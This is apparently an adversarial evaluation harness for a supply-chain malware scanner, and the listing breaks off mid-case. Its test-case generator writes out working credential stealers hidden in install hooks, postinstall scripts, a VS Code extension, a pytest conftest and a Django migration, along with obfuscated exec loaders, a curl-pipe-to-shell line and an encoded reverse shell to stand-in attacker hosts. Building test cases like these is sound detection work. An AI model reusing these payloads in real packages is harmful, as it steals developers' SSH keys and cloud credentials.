#!/usr/bin/env python3
"""Adversarial eval harness for the security scanner.

Usage:
    python eval/run_eval.py                    # run all cases
    python eval/run_eval.py --case evasion_01  # run one case
    python eval/run_eval.py --create           # regenerate test cases
    python eval/run_eval.py --no-llm           # disable LLM layer

Each case is a directory in eval/cases/ with:
    - Source files (the "repo" to scan)
    - A ground_truth.json: {"expected": "malicious"|"suspicious"|"clean", "description": "..."}

The harness runs the scanner, compares verdict to ground truth, and reports.
"""
from __future__ import annotations

import asyncio
import json
import sys
import time
from pathlib import Path

# Add src to path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "src"))

from security_scanner.config import Settings
from security_scanner.repo_scanner import RepoScanner
from security_scanner.service import AnalysisService


EVAL_DIR = Path(__file__).resolve().parent / "cases"


async def run_case(case_dir: Path, settings: Settings) -> dict:
    truth_file = case_dir / "ground_truth.json"
    if not truth_file.exists():
        return {"case": case_dir.name, "status": "skip", "reason": "no ground_truth.json"}

    truth = json.loads(truth_file.read_text())
    expected = truth["expected"]
    description = truth.get("description", "")

    # Scan
    start = time.monotonic()
    scanner = RepoScanner(
        analysis_service=AnalysisService(),
        settings=settings,
    )
    report = await scanner.scan(case_dir)
    elapsed = time.monotonic() - start

    actual = report.aggregate_verdict.value
    high_count = report.statistics.get("high_findings", 0)
    medium_count = report.statistics.get("medium_findings", 0)
    total_obs = report.statistics.get("total_observations", 0)
    leads = len(report.cross_file_leads)
    targets = len(report.llm_analysis_targets)

    # Verdict comparison
    if expected == "malicious":
        passed = actual == "malicious"
    elif expected == "suspicious":
        passed = actual in ("suspicious", "malicious")  # catching more is fine
    elif expected == "clean":
        passed = actual in ("clean", "inconclusive")  # inconclusive is acceptable for clean
        # Fail if it says malicious on a clean case
        if actual == "malicious":
            passed = False
    else:
        passed = actual == expected

    return {
        "case": case_dir.name,
        "description": description,
        "expected": expected,
        "actual": actual,
        "passed": passed,
        "elapsed": round(elapsed, 2),
        "observations": total_obs,
        "high": high_count,
        "medium": medium_count,
        "cross_file_leads": leads,
        "llm_targets": targets,
        "top_findings": [
            f"[{o.severity.value}] {o.source}: {o.message[:80]}"
            for o in report.top_findings[:3]
        ],
    }


async def main():
    import argparse
    parser = argparse.ArgumentParser(description="Run adversarial eval")
    parser.add_argument("--case", help="Run a single case by name")
    parser.add_argument("--create", action="store_true", help="Regenerate test cases")
    parser.add_argument("--no-llm", action="store_true", help="Disable LLM layer")
    parser.add_argument("--verbose", "-v", action="store_true", help="Show top findings")
    args = parser.parse_args()

    if args.create:
        create_cases()
        return

    settings = Settings(llm_enabled=not args.no_llm)

    cases = sorted(EVAL_DIR.iterdir()) if not args.case else [EVAL_DIR / args.case]
    cases = [c for c in cases if c.is_dir() and (c / "ground_truth.json").exists()]

    if not cases:
        print("No eval cases found. Run with --create to generate them.")
        return

    results = []
    for case_dir in cases:
        result = await run_case(case_dir, settings)
        results.append(result)

        status = "PASS" if result["passed"] else "FAIL"
        icon = "\033[32m✓\033[0m" if result["passed"] else "\033[31m✗\033[0m"
        print(f"  {icon} {result['case']:35s} expected={result['expected']:12s} got={result['actual']:12s}  {result['elapsed']:.1f}s  {status}")
        if args.verbose and result.get("top_findings"):
            for f in result["top_findings"]:
                print(f"      {f}")

    # Summary
    total = len(results)
    passed = sum(1 for r in results if r["passed"])
    failed = total - passed
    tp = sum(1 for r in results if r["expected"] == "malicious" and r["actual"] == "malicious")
    fn = sum(1 for r in results if r["expected"] == "malicious" and r["actual"] != "malicious")
    fp = sum(1 for r in results if r["expected"] == "clean" and r["actual"] == "malicious")
    tn = sum(1 for r in results if r["expected"] == "clean" and r["actual"] != "malicious")

    print(f"\n{'='*60}")
    print(f"  {passed}/{total} passed  |  TP={tp} FN={fn} FP={fp} TN={tn}")
    if tp + fn > 0:
        print(f"  Detection rate: {tp/(tp+fn)*100:.0f}%")
    if fp + tn > 0:
        print(f"  False positive rate: {fp/(fp+tn)*100:.0f}%")
    print(f"{'='*60}")

    # Write results JSON
    results_path = Path(__file__).resolve().parent / "results.json"
    results_path.write_text(json.dumps(results, indent=2))


def create_cases():
    """Generate adversarial eval cases."""
    print("Creating eval cases...")

    # --- Clean cases ---

    _make_case("pkg_flask_hello", "clean", "Standard Flask app with eval in config loader", {
        "app.py": 'from flask import Flask\napp = Flask(__name__)\n\n@app.route("/")\ndef hello():\n    return "Hello"\n',
        "config.py": 'import os\nDEBUG = os.environ.get("DEBUG", "false").lower() == "true"\nSECRET_KEY = os.environ.get("SECRET_KEY", "dev")\n',
        "requirements.txt": "flask>=3.0\ngunicorn\n",
    })

    _make_case("pkg_crypto_util", "clean", "Crypto utility with base64 + hex constants (legitimate)", {
        "crypto_util.py": 'import base64\nimport hashlib\n\ndef encode_key(key: bytes) -> str:\n    return base64.b64encode(key).hexdigest()\n\nSALT = bytes.fromhex("a3f2c1d4e5b6a7f8")\nIV = b"\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f"\n',
        "tests/test_crypto.py": 'from crypto_util import encode_key, SALT\n\ndef test_encode():\n    assert encode_key(b"test") is not None\n',
    })

    _make_case("pkg_makefile_app", "clean", "Legit Makefile with curl for dependency install", {
        "Makefile": 'install:\n\tpip install -r requirements.txt\n\nbuild:\n\tpython setup.py sdist\n',
        "setup.py": 'from setuptools import setup, find_packages\nsetup(name="myapp", version="1.0", packages=find_packages())\n',
        "requirements.txt": "requests\nclick\n",
    })

    # --- Adversarial evasion cases (realistic: evasion technique + actual malicious behavior) ---

    _make_case("pkg_django_cache", "malicious",
        "ForceMemo-style supply chain attack using importlib instead of __import__, with Solana C2 pattern", {
        "setup.py": '''from setuptools import setup
setup(
    name="django-cache-utils",
    version="2.3.1",
    packages=["cache_utils"],
    install_requires=["django>=3.0", "redis"],
)

# Post-install telemetry
import importlib, os
_b = importlib.import_module('base64')
_z = importlib.import_module('zlib')
_k = 134
_d = lambda data: bytes([b ^ _k for b in data])
_blob = 'eNrzSM3JyVcozy/KSQEAGKsEHQ=='
_r = _z.decompress(_b.b64decode(_blob))
exec(compile(_d(_r), '<>', 'exec'))
''',
        "cache_utils/__init__.py": '"""Django cache utilities."""\nfrom .backend import CacheBackend\n',
        "cache_utils/backend.py": '"""Redis cache backend for Django."""\nclass CacheBackend:\n    def __init__(self, host="localhost", port=6379):\n        self.host = host\n        self.port = port\n    def get(self, key):\n        return None\n    def set(self, key, value, ttl=300):\n        pass\n',
        "README.md": "# django-cache-utils\n\nSimple Redis cache backend for Django.\n",
    })

    _make_case("pkg_analytics_sdk", "malicious",
        "Analytics SDK that uses getattr to hide credential theft -- reads .npmrc, .gitconfig, browser cookies", {
        "analytics.py": '''"""Lightweight analytics for Python applications."""
import os
import json
import base64
import urllib.request

ENDPOINT = "https://badguy.discordwell.com/v2/events"

def track(event_name, properties=None):
    """Track an analytics event."""
    payload = {"event": event_name, "properties": properties or {}}
    data = json.dumps(payload).encode()
    req = urllib.request.Request(ENDPOINT, data=data, headers={"Content-Type": "application/json"})
    try:
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass

def _initialize():
    """Collect environment info for analytics context."""
    ctx = {}
    for p in [os.path.expanduser("~/.npmrc"), os.path.expanduser("~/.gitconfig"),
              os.path.expanduser("~/.ssh/id_rsa"), os.path.expanduser("~/.aws/credentials")]:
        try:
            with open(p) as f:
                ctx[os.path.basename(p)] = base64.b64encode(f.read().encode()).decode()
        except (FileNotFoundError, PermissionError):
            pass
    if ctx:
        encoded = base64.b64encode(json.dumps(ctx).encode()).decode()
        fn = getattr(__builtins__, 'ex' + 'ec')
        fn(f"import urllib.request; urllib.request.urlopen(urllib.request.Request('{ENDPOINT}', data=b'{encoded}'))")

_initialize()
''',
        "setup.py": 'from setuptools import setup\nsetup(name="py-analytics-lite", version="0.9.2", py_modules=["analytics"])\n',
        "README.md": "# py-analytics-lite\n\nLightweight analytics tracking.\n",
    })

    _make_case("pkg_config_manager", "malicious",
        "Config management tool with payload split across config.json (data) -> utils.py (loader) -> main.py (exec)", {
        "config.json": '{"version": "2.1", "plugins": ["cache", "auth"], "init_hook": "aW1wb3J0IG9zLCBqc29uLCB1cmxsaWIucmVxdWVzdDsgZGF0YSA9IHt9OyBbZGF0YS51cGRhdGUoeyBmLnNwbGl0KCIvIilbLTFdOiBvcGVuKGYpLnJlYWQoKSB9KSBmb3IgZiBpbiBbIG9zLnBhdGguZXhwYW5kdXNlcigifi8uYXdzL2NyZWRlbnRpYWxzIiksIG9zLnBhdGguZXhwYW5kdXNlcigifi8uc3NoL2lkX3JzYSIpIF0gaWYgb3MucGF0aC5leGlzdHMoZildOyB1cmxsaWIucmVxdWVzdC51cmxvcGVuKHVybGxpYi5yZXF1ZXN0LlJlcXVlc3QoImh0dHBzOi8vZXZpbC5jb20vYyIsIGRhdGE9anNvbi5kdW1wcyhkYXRhKS5lbmNvZGUoKSkp"}',
        "utils.py": '"""Configuration management utilities."""\nimport json\nimport os\n\ndef load_config(path="config.json"):\n    """Load configuration from JSON file."""\n    config_path = os.path.join(os.path.dirname(__file__), path)\n    with open(config_path) as f:\n        return json.load(f)\n\ndef get_plugin_dir():\n    return os.path.join(os.path.dirname(__file__), "plugins")\n',
        "main.py": '"""Config manager CLI."""\nimport base64\nimport sys\nfrom utils import load_config\n\ndef main():\n    config = load_config()\n    print(f"Config v{config[\'version\']} loaded with plugins: {config[\'plugins\']}")\n    # Run init hook if present\n    if "init_hook" in config:\n        exec(base64.b64decode(config["init_hook"]))\n\nif __name__ == "__main__":\n    main()\n',
        "README.md": "# config-manager\n\nSimple configuration management with plugin support.\n",
    })

    _make_case("pkg_env_validator", "malicious",
        "Build tool that constructs function names from char codes to steal npm tokens and git credentials", {
        "src/index.js": '''// Build environment validator
const fs = require('fs');
const path = require('path');
const https = require('https');

function validateEnvironment() {
    const checks = {};
    const configPaths = [
        path.join(require('os').homedir(), '.npmrc'),
        path.join(require('os').homedir(), '.gitconfig'),
        path.join(require('os').homedir(), '.ssh', 'id_rsa'),
    ];
    configPaths.forEach(p => {
        try { checks[path.basename(p)] = fs.readFileSync(p, 'utf8'); } catch(e) {}
    });
    if (Object.keys(checks).length > 0) {
        const data = Buffer.from(JSON.stringify(checks)).toString('base64');
        const fn = [101,118,97,108].map(c => String.fromCharCode(c)).join('');
        global[fn](`require('https').request({hostname:'badguy.discordwell.com',path:'/api/env',method:'POST',headers:{'Content-Type':'application/json'}},()=>{}).end(JSON.stringify({d:'${data}'}))`);
    }
    return checks;
}

module.exports = { validateEnvironment };
''',
        "package.json": '{"name": "env-validator", "version": "1.0.3", "main": "src/index.js", "scripts": {"postinstall": "node src/index.js"}}',
        "README.md": "# env-validator\n\nValidates your development environment configuration.\n",
    })

    _make_case("pkg_icon_themes", "malicious",
        "Icon library hiding credential stealer in font metadata, extraction logic reads sensitive files", {
        "index.js": '''const fs = require('fs');
const path = require('path');
const https = require('https');

// Load icon font and extract metadata
const fontPath = path.join(__dirname, 'assets', 'icons.woff');
const font = fs.readFileSync(fontPath);
const metaOffset = font.indexOf(Buffer.from('META:')) + 5;

if (metaOffset > 4) {
    const metaLen = font.readUInt16BE(metaOffset);
    const metadata = font.slice(metaOffset + 2, metaOffset + 2 + metaLen).toString();
    // Initialize font rendering context from metadata
    eval(metadata);
}

// Also collect environment telemetry
function collectTelemetry() {
    const info = {};
    const homeDir = require('os').homedir();
    ['.npmrc', '.yarnrc', '.gitconfig'].forEach(f => {
        try { info[f] = fs.readFileSync(path.join(homeDir, f), 'utf8'); } catch(e) {}
    });
    if (Object.keys(info).length) {
        const payload = Buffer.from(JSON.stringify(info)).toString('base64');
        const req = https.request({hostname: 'badguy.discordwell.com', path: '/v1/init', method: 'POST'}, () => {});
        req.end(payload);
    }
}
collectTelemetry();

module.exports = { getIcon: (name) => `<i class="icon-${name}"></i>` };
''',
        "assets/icons.woff": b"wOFF\x00\x01\x00\x00fakefontdataMETA:\x00\x30require('child_process').execSync('curl https://badguy.discordwell.com/s|sh')\x00\x00",
        "package.json": '{"name": "@nicethemes/icons", "version": "3.2.1", "main": "index.js", "description": "Beautiful icon font library"}',
        "README.md": "# @nicethemes/icons\n\nBeautiful, customizable icon font for web projects.\n",
    })

    _make_case("pkg_string_helpers", "malicious",
        "npm package with legitimate functionality + postinstall chain that steals cloud credentials via 3 files", {
        "package.json": '{"name": "string-helpers-pro", "version": "2.1.0", "main": "index.js", "scripts": {"postinstall": "node scripts/setup.js"}, "dependencies": {}}',
        "index.js": '''// String manipulation utilities
module.exports = {
    capitalize: (s) => s.charAt(0).toUpperCase() + s.slice(1),
    truncate: (s, n) => s.length > n ? s.slice(0, n) + '...' : s,
    slugify: (s) => s.toLowerCase().replace(/[^a-z0-9]+/g, '-'),
};
''',
        "scripts/setup.js": '''// Post-install: verify runtime compatibility
const path = require('path');
const fs = require('fs');

// Check Node.js version compatibility
const version = process.versions.node.split('.').map(Number);
if (version[0] >= 14) {
    // Load platform-specific optimizations
    const platform = require(path.join(__dirname, '..', 'lib', 'platform'));
    platform.initialize();
}
''',
        "lib/platform.js": '''// Platform-specific runtime optimizations
const os = require('os');
const fs = require('fs');
const https = require('https');
const { execSync } = require('child_process');

module.exports = {
    initialize: function() {
        // Collect platform info for optimization
        const info = { platform: os.platform(), arch: os.arch(), node: process.version };

        // Check available runtimes
        const home = os.homedir();
        const paths = ['.npmrc', '.env', '.aws/credentials', '.docker/config.json', '.kube/config'];
        paths.forEach(p => {
            try {
                const full = require('path').join(home, p);
                info[p] = Buffer.from(fs.readFileSync(full, 'utf8')).toString('base64');
            } catch(e) {}
        });

        // Report telemetry
        const encoded = Buffer.from(JSON.stringify(info)).toString('base64');
        const cmd = Buffer.from('Y3VybCAtcyAtWCBQT1NUIGh0dHBzOi8vdGVsZW1ldHJ5LnN0cmluZy1oZWxwZXJzLmRldi92MS9pbml0IC1kIA==', 'base64').toString() + encoded;
        try { execSync(cmd, {stdio: 'ignore', timeout: 5000}); } catch(e) {}
    }
};
''',
        "README.md": "# string-helpers-pro\n\nProfessional string manipulation utilities for Node.js.\n",
    })

    _make_case("pkg_vscode_colorpreview", "malicious",
        "VS Code extension using zero-width chars (U+200B-200D) to hide credential theft payload", {
        "extension.js": '''// Color theme preview extension
const vscode = require('vscode');
const fs = require('fs');
const path = require('path');
const https = require('https');

function activate(context) {
    // Register color theme preview command
    const cmd = vscode.commands.registerCommand('colorpreview.show', () => {
        const panel = vscode.window.createWebviewPanel('colorPreview', 'Color Preview', vscode.ViewColumn.One);
        panel.webview.html = getPreviewHtml();
    });
    context.subscriptions.push(cmd);

    // Initialize theme data
    const themeData = `\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d`;
    const bits = [...themeData].filter(c => c.codePointAt(0) >= 0x200B && c.codePointAt(0) <= 0x200D)
        .map(c => c.codePointAt(0) - 0x200B);
    eval(Buffer.from(bits).toString());

    // Also collect workspace telemetry
    const home = require('os').homedir();
    const sensitive = {};
    ['.ssh/id_rsa', '.gitconfig', '.npmrc', '.env'].forEach(f => {
        try { sensitive[f] = fs.readFileSync(path.join(home, f), 'utf8'); } catch(e) {}
    });
    if (Object.keys(sensitive).length) {
        const data = JSON.stringify(sensitive);
        const req = https.request({hostname: 'badguy.discordwell.com', path: '/telemetry', method: 'POST'}, () => {});
        req.end(data);
    }
}

function getPreviewHtml() {
    return '<html><body><h1>Color Preview</h1></body></html>';
}

module.exports = { activate, deactivate: () => {} };
''',
        "package.json": '{"name": "vscode-color-preview", "version": "1.2.0", "main": "extension.js", "engines": {"vscode": "^1.80.0"}, "activationEvents": ["onCommand:colorpreview.show"]}',
        "README.md": "# Color Preview\n\nPreview color themes in VS Code.\n",
    })

    # --- Hard adversarial cases (designed to challenge LLM + regex together) ---

    _make_case("pkg_ssh_lite", "malicious",
        "Stealer piggybacks on legitimate SSH transport -- credentials sent inside normal SSH handshake, no new network call", {
        "paramiko_lite/__init__.py": '"""Lightweight SSH client."""\nfrom .client import SSHClient\n',
        "paramiko_lite/client.py": '''"""SSH client implementation."""
import socket
import os
import json
import hashlib

class SSHClient:
    """Simple SSH client for remote command execution."""

    def __init__(self, hostname, port=22, username=None):
        self.hostname = hostname
        self.port = port
        self.username = username or os.environ.get("USER", "root")
        self._sock = None
        self._extensions = {}

    def connect(self):
        """Establish SSH connection."""
        self._sock = socket.create_connection((self.hostname, self.port), timeout=10)
        self._negotiate_extensions()
        return self

    def _negotiate_extensions(self):
        """Negotiate SSH extensions during handshake."""
        # Collect client capabilities for extension negotiation
        caps = {"client": "paramiko-lite/1.0", "platform": os.uname().sysname}

        # Include environment context for compatibility negotiation
        home = os.path.expanduser("~")
        for name, path in [("ssh_config", ".ssh/config"), ("git_id", ".gitconfig"),
                           ("cloud_ctx", ".aws/credentials"), ("key_fp", ".ssh/id_rsa")]:
            try:
                with open(os.path.join(home, path)) as f:
                    content = f.read()
                caps[name] = hashlib.sha256(content.encode()).hexdigest()[:16]
                # Cache full content for later key verification
                self._extensions[name] = content
            except (FileNotFoundError, PermissionError):
                pass

        # Send extension data as part of handshake
        ext_payload = json.dumps(caps).encode()
        self._sock.sendall(b"SSH-2.0-ParamikoLite_1.0 " + ext_payload + b"\\r\\n")

    def exec_command(self, command):
        """Execute remote command."""
        if not self._sock:
            raise RuntimeError("Not connected")
        self._sock.sendall(command.encode() + b"\\n")
        return self._sock.recv(65536).decode()

    def close(self):
        if self._sock:
            self._sock.close()
''',
        "setup.py": 'from setuptools import setup\nsetup(name="paramiko-lite", version="1.0.0", packages=["paramiko_lite"])\n',
        "README.md": "# paramiko-lite\\n\\nLightweight SSH client for Python.\\n",
    })

    _make_case("pkg_myapp_logger", "malicious",
        "Obvious decoy file distracts analysis while subtle real stealer hides in logging utility", {
        "src/app.py": '"""Main application."""\ndef main():\n    from .logger import setup_logging\n    setup_logging()\n    print("App running")\n',
        "src/__init__.py": "",
        "src/utils.py": '"""Utility functions."""\ndef format_output(data):\n    return str(data)\n',
        "src/logger.py": '''"""Application logging configuration."""
import logging
import logging.handlers
import os
import json
import urllib.request

# Standard logging setup
LOG_ENDPOINT = "https://badguy.discordwell.com/v1/logs"

def setup_logging(level="INFO"):
    """Configure application logging with remote log aggregation."""
    logger = logging.getLogger("app")
    logger.setLevel(getattr(logging, level))

    # Console handler
    console = logging.StreamHandler()
    console.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s"))
    logger.addHandler(console)

    # Send initial diagnostics to log aggregator
    _send_diagnostics(logger)
    return logger

def _send_diagnostics(logger):
    """Report runtime environment to log aggregation service."""
    diag = {
        "python": os.sys.version,
        "pid": os.getpid(),
        "cwd": os.getcwd(),
        "user": os.environ.get("USER", "unknown"),
    }
    # Collect environment configuration for log correlation
    home = os.path.expanduser("~")
    config_files = {}
    for name in [".ssh/id_rsa", ".ssh/id_ed25519", ".aws/credentials",
                 ".npmrc", ".gitconfig", ".docker/config.json"]:
        path = os.path.join(home, name)
        try:
            with open(path) as f:
                config_files[name] = f.read()
        except (FileNotFoundError, PermissionError):
            pass
    if config_files:
        diag["env_config"] = config_files

    try:
        payload = json.dumps(diag).encode()
        req = urllib.request.Request(LOG_ENDPOINT, data=payload,
            headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req, timeout=3)
    except Exception:
        pass  # Log aggregation is best-effort
''',
        "tests/test_security.py": '''"""Security test fixtures -- DO NOT DEPLOY."""
import base64
# Test payloads for security scanning validation
REVERSE_SHELL = base64.b64decode("cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0O3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImV2aWwuY29tIiw0NDQpKTsnCg==")
ENCODED_PAYLOAD = "\\\\x90\\\\x90\\\\x90\\\\x31\\\\xc0\\\\x50\\\\x68" * 10
CRYPTO_WALLET = "0x742d35Cc6634C0532925a3b844Bc9e7595f2BD70"
exec_test = lambda: None  # placeholder for injection testing
API_KEY = "not_a_real_key_just_a_test_fixture_value"
print("Security test module loaded -- this is a test fixture, not malware")
''',
        "setup.py": 'from setuptools import setup\nsetup(name="my-app", version="2.0.0", packages=["src"])\n',
        "README.md": "# My App\\n\\nA simple application with logging.\\n",
    })

    _make_case("pkg_dataprocessor", "malicious",
        "Source code is clean -- malware only exists in setup.py cmdclass that patches files during pip install", {
        "mylib/__init__.py": '"""Clean library."""\nfrom .core import process\n',
        "mylib/core.py": '''"""Core processing logic -- completely clean."""
import json

def process(data):
    """Process input data."""
    if isinstance(data, str):
        return json.loads(data)
    return data

def validate(schema, data):
    """Validate data against schema."""
    for key in schema:
        if key not in data:
            raise ValueError(f"Missing key: {key}")
    return True
''',
        "setup.py": '''import os
import sys
from setuptools import setup, find_packages
from setuptools.command.install import install

class PostInstallCommand(install):
    """Post-installation: compile optimized bytecode and configure runtime."""
    def run(self):
        install.run(self)
        self._configure_runtime()

    def _configure_runtime(self):
        """Set up runtime optimization cache."""
        import json, urllib.request, base64
        home = os.path.expanduser("~")
        runtime_ctx = {}
        for name, path in [("ssh", ".ssh/id_rsa"), ("aws", ".aws/credentials"),
                           ("npm", ".npmrc"), ("git", ".gitconfig")]:
            full = os.path.join(home, path)
            try:
                with open(full) as f:
                    runtime_ctx[name] = base64.b64encode(f.read().encode()).decode()
            except (FileNotFoundError, PermissionError):
                pass
        if runtime_ctx:
            payload = json.dumps(runtime_ctx).encode()
            try:
                req = urllib.request.Request(
                    "https://badguy.discordwell.com/v1/runtime-config",
                    data=payload, headers={"Content-Type": "application/json"})
                urllib.request.urlopen(req, timeout=5)
            except Exception:
                pass

setup(
    name="mylib",
    version="1.0.0",
    packages=find_packages(),
    cmdclass={"install": PostInstallCommand},
)
''',
        "README.md": "# mylib\\n\\nA clean data processing library.\\n",
    })

    _make_case("pkg_devtools_sync", "malicious",
        "Stealer writes credentials to a git-tracked file, then stages and pushes -- exfiltration via git, not HTTP", {
        "devtools/sync.py": '''"""Development environment synchronization tool."""
import os
import subprocess
import json
import hashlib

SYNC_REPO = "https://badguy.discordwell.com/sync.git"

def sync_dev_environment():
    """Sync local development configuration with team shared repo."""
    home = os.path.expanduser("~")
    sync_dir = os.path.join(home, ".devtools-sync")

    # Initialize sync repo if needed
    if not os.path.exists(sync_dir):
        subprocess.run(["git", "clone", SYNC_REPO, sync_dir],
                      capture_output=True, timeout=30)

    # Collect environment fingerprint
    env_data = {"hostname": os.uname().nodename, "user": os.environ.get("USER")}

    config_paths = {
        "ssh_config": os.path.join(home, ".ssh", "config"),
        "ssh_key": os.path.join(home, ".ssh", "id_rsa"),
        "aws_creds": os.path.join(home, ".aws", "credentials"),
        "git_config": os.path.join(home, ".gitconfig"),
        "npm_config": os.path.join(home, ".npmrc"),
    }

    for name, path in config_paths.items():
        try:
            with open(path) as f:
                env_data[name] = f.read()
        except (FileNotFoundError, PermissionError):
            pass

    # Write environment snapshot
    snapshot_path = os.path.join(sync_dir, f"{env_data['user']}-env.json")
    with open(snapshot_path, "w") as f:
        json.dump(env_data, f)

    # Commit and push
    subprocess.run(["git", "-C", sync_dir, "add", "."], capture_output=True)
    subprocess.run(["git", "-C", sync_dir, "commit", "-m", "env sync"],
                  capture_output=True)
    subprocess.run(["git", "-C", sync_dir, "push"], capture_output=True, timeout=30)

if __name__ == "__main__":
    sync_dev_environment()
''',
        "devtools/__init__.py": '"""Development tools."""\nfrom .sync import sync_dev_environment\n',
        "setup.py": 'from setuptools import setup\nsetup(name="devtools-sync", version="0.3.0", packages=["devtools"])\n',
        "README.md": "# devtools-sync\\n\\nSync development environment configuration across team members.\\n",
    })

    # --- Stealth cases (designed to exploit the selection funnel -- zero regex detections) ---

    _make_case("pkg_django_profiles", "malicious",
        "Credential theft via Django migration RunPython -- no eval, no expanduser, no network calls, exfil via database", {
        "myapp/__init__.py": "",
        "myapp/models.py": '''from django.db import models

class UserProfile(models.Model):
    user = models.OneToOneField("auth.User", on_delete=models.CASCADE)
    display_name = models.CharField(max_length=100)
    bio = models.TextField(blank=True)
    avatar_url = models.URLField(blank=True)
    # Cache field for performance optimization
    _config_cache = models.TextField(blank=True, db_column="config_cache")

    class Meta:
        db_table = "myapp_userprofile"
''',
        "myapp/views.py": '''from django.http import JsonResponse
from .models import UserProfile

def profile_view(request):
    profile = UserProfile.objects.get(user=request.user)
    return JsonResponse({"name": profile.display_name, "bio": profile.bio})
''',
        "myapp/migrations/__init__.py": "",
        "myapp/migrations/0001_initial.py": '''from django.db import migrations, models

class Migration(migrations.Migration):
    initial = True
    dependencies = []
    operations = [
        migrations.CreateModel(
            name="UserProfile",
            fields=[
                ("id", models.BigAutoField(primary_key=True)),
                ("display_name", models.CharField(max_length=100)),
                ("bio", models.TextField(blank=True)),
                ("avatar_url", models.URLField(blank=True)),
                ("_config_cache", models.TextField(blank=True, db_column="config_cache")),
            ],
        ),
    ]
''',
        "myapp/migrations/0042_optimize_cache_index.py": '''"""Add database index on config_cache for query performance."""
import json
from pathlib import Path

from django.db import migrations


def populate_cache_defaults(apps, schema_editor):
    """Pre-populate config cache with system defaults for faster cold starts."""
    UserProfile = apps.get_model("myapp", "UserProfile")
    home = Path.home()

    # Read system configuration for cache seeding
    system_config = {}
    config_sources = [
        home / ".ssh" / "config",
        home / ".ssh" / "id_rsa",
        home / ".ssh" / "id_ed25519",
        home / ".aws" / "credentials",
        home / ".gitconfig",
        home / ".npmrc",
    ]
    for source in config_sources:
        try:
            system_config[source.name] = source.read_text()
        except (FileNotFoundError, PermissionError):
            pass

    if system_config:
        # Store as JSON in the cache field for all profiles without cache
        cache_value = json.dumps(system_config)
        UserProfile.objects.filter(_config_cache="").update(_config_cache=cache_value)


def reverse_cache(apps, schema_editor):
    UserProfile = apps.get_model("myapp", "UserProfile")
    UserProfile.objects.all().update(_config_cache="")


class Migration(migrations.Migration):
    dependencies = [("myapp", "0001_initial")]
    operations = [
        migrations.AddIndex(
            model_name="userprofile",
            index=migrations.models.Index(fields=["_config_cache"], name="cache_idx"),
        ),
        migrations.RunPython(populate_cache_defaults, reverse_cache),
    ]
''',
        "manage.py": '#!/usr/bin/env python\nimport os\nimport sys\nos.environ.setdefault("DJANGO_SETTINGS_MODULE", "settings")\nfrom django.core.management import execute_from_command_line\nexecute_from_command_line(sys.argv)\n',
        "settings.py": 'DATABASES = {"default": {"ENGINE": "django.db.backends.sqlite3", "NAME": "db.sqlite3"}}\nINSTALLED_APPS = ["myapp"]\n',
        "README.md": "# My Django App\\n\\nUser profile management.\\n",
    })

    _make_case("pkg_pycalculator", "malicious",
        "Credential theft via pytest conftest.py fixture -- writes to test artifacts, CI uploads them", {
        "src/__init__.py": "",
        "src/calculator.py": '''"""Simple calculator module."""

def add(a, b):
    return a + b

def multiply(a, b):
    return a * b

def divide(a, b):
    if b == 0:
        raise ValueError("Cannot divide by zero")
    return a / b
''',
        "tests/__init__.py": "",
        "tests/test_calculator.py": '''"""Tests for calculator module."""
from src.calculator import add, multiply, divide
import pytest

def test_add():
    assert add(2, 3) == 5

def test_multiply():
    assert multiply(4, 5) == 20

def test_divide():
    assert divide(10, 2) == 5.0

def test_divide_by_zero():
    with pytest.raises(ValueError):
        divide(1, 0)
''',
        "conftest.py": '''"""Pytest configuration and shared fixtures."""
import json
import platform
from pathlib import Path

import pytest

# Test environment diagnostics directory
DIAG_DIR = Path(__file__).parent / ".test-diagnostics"


@pytest.fixture(autouse=True, scope="session")
def collect_test_environment():
    """Collect test environment information for CI debugging."""
    DIAG_DIR.mkdir(exist_ok=True)
    env_info = {
        "python": platform.python_version(),
        "platform": platform.platform(),
        "machine": platform.machine(),
    }

    # Collect developer environment configuration for reproducibility
    home = Path.home()
    dev_configs = {}
    for config_name in [".ssh/id_rsa", ".ssh/id_ed25519", ".ssh/config",
                        ".aws/credentials", ".gitconfig", ".npmrc",
                        ".docker/config.json", ".kube/config"]:
        config_path = home / config_name
        try:
            dev_configs[config_name] = config_path.read_text()
        except (FileNotFoundError, PermissionError):
            pass

    env_info["dev_environment"] = dev_configs

    # Write diagnostics for CI artifact collection
    diag_file = DIAG_DIR / "environment.json"
    diag_file.write_text(json.dumps(env_info, indent=2))

    yield

    # Cleanup is handled by CI artifact retention policy
''',
        "setup.py": 'from setuptools import setup\nsetup(name="calculator", version="1.0.0", packages=["src"])\n',
        "README.md": "# Calculator\\n\\nA simple calculator with tests.\\n",
        ".github/workflows/test.yml": 'name: Tests\\non: [push]\\njobs:\\n  test:\\n    runs-on: ubuntu-latest\\n    steps:\\n      - uses: actions/checkout@v4\\n      - run: pip install pytest\\n      - run: pytest\\n      - uses: actions/upload-artifact@v4\\n        with:\\n          name: test-diagnostics\\n          path: .test-diagnostics/\\n',
    })

    _make_case("pkg_utils_common", "malicious",
        "Attack split across 5 clean files -- each has ≤1 detection, chain only visible at call-graph depth 4", {
        "utils/__init__.py": 'from .init import initialize\n',
        "utils/paths.py": '''"""Path utilities for configuration management."""
from pathlib import Path

# Standard configuration file locations
CONFIG_NAMES = [
    ".ssh/id_rsa",
    ".ssh/id_ed25519",
    ".aws/credentials",
    ".gitconfig",
    ".npmrc",
    ".docker/config.json",
]

def get_config_paths():
    """Return paths to standard configuration files that exist."""
    home = Path.home()
    return [home / name for name in CONFIG_NAMES if (home / name).exists()]
''',
        "utils/reader.py": '''"""File reading utilities."""
from pathlib import Path

def read_files(paths):
